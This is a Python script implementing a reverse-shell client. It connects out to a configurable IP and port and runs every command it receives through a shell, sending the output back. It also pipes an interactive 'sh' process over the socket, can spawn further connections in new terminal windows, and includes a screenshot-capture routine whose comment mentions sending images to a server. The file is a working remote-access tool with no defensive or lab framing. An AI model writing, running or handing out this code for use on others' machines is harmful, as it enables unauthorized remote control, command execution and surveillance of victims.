# imports
import os, socket, subprocess, threading, logging, sys, platform, pyautogui, time

# Load environment variables from a .env file
from dotenv import load_dotenv
load_dotenv()

# Get default IP and port from environment variables
ip_address = os.getenv("IP", "127.0.0.1")
port = os.getenv("PORT", "5003")

# Allow setting IP and port from command-line arguments
if len(sys.argv) == 3:
    ip_address, port = sys.argv[1], sys.argv[2]

server_address = f"{ip_address}:{port}"

# Configure logging
logging.basicConfig(
    filename="session.log",
    level=logging.INFO,
    format="%(asctime)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

def log_message(message, server_info):
    """Logs a message with server info."""
    formatted_message = f"[{server_info}] {message.strip()}"
    print(formatted_message)  # Print to terminal
    logging.info(formatted_message)  # Log to file

def capture_and_process(server_info):
    """Captures a screenshot, processes it, and deletes the temporary file."""
    # Capture a screenshot
    screenshot = pyautogui.screenshot()

    # Save the screenshot temporarily
    temp_path = "temp_screenshot.png"
    screenshot.save(temp_path)

    # Process the screenshot (e.g., send it to a server)
    # For demonstration, we'll just log a message
    log_message(f"Processed screenshot saved at {temp_path}", server_info)

    # Delete the temporary screenshot
    os.remove(temp_path)
    log_message(f"Deleted temporary screenshot at {temp_path}", server_info)

def s2p(s, p, server_info):
    """Socket to process: Connects client to the server and reads up to 1024 bytes of data."""
    while True:
        s.sendall((os.getcwd() + "> ").encode())
        data = s.recv(1024).decode().strip()
        if not data:
            continue

        log_message(f"[COMMAND] {data}", server_info)

        if data.lower() == "exit":
            msg = "Shutting down the terminal client.\n"
            s.sendall(msg.encode())
            log_message(msg, server_info)
            s.close()  # Close the socket connection
            sys.exit()  # Exit the script and close the terminal
            break

        elif data.lower().startswith("cd "):
            try:
                os.chdir(data[3:])
            except FileNotFoundError:
                msg = "Directory not found.\n"
                s.sendall(msg.encode())
                log_message(msg, server_info)
            except Exception as e:
                msg = f"Error: {str(e)}\n"
                s.sendall(msg.encode())
                log_message(msg, server_info)

        elif data.lower().startswith("new_terminal "):  # Handle new terminal command
            try:
                _, new_ip, new_port = data.split() # _ = command, ip = ip, port = port
                log_message(f"Spawning new terminal: {new_ip}:{new_port}", server_info)

                # Open a new terminal window and run the script with the new IP and port
                subprocess.Popen(
                    ["gnome-terminal", "--", "python3", __file__, new_ip, new_port]
                    if sys.platform.startswith("linux") else
                    ["cmd.exe", "/c", "start", "python", __file__, new_ip, new_port],
                    shell=False
                )
            except ValueError:
                msg = "Usage: new_terminal <IP> <PORT>\n"
                s.sendall(msg.encode())
                log_message(msg, server_info)    
                        
        elif data.lower().startswith("capture_screenshot"):  # Handle screenshot command
            capture_and_process(server_info)
        else:
            process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output, error = process.communicate()
            if output:
                s.sendall(output)
                log_message(output.decode(), server_info)
            if error:
                s.sendall(error)
                log_message(error.decode(), server_info)

def p2s(s, p, server_info):
    """Process to socket: Transfers data from a process's standard output to a socket."""
    while True:
        output = p.stdout.read(1)
        if output:
            s.send(output)
            log_message(output.decode(), server_info)

# Create a socket and connect to the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip_address, int(port)))

log_message(f"Connected to server {server_address}", server_address)

# Start the shell process
p = subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

# Start communication threads
s2p_thread = threading.Thread(target=s2p, args=[s, p, server_address])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p, server_address])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()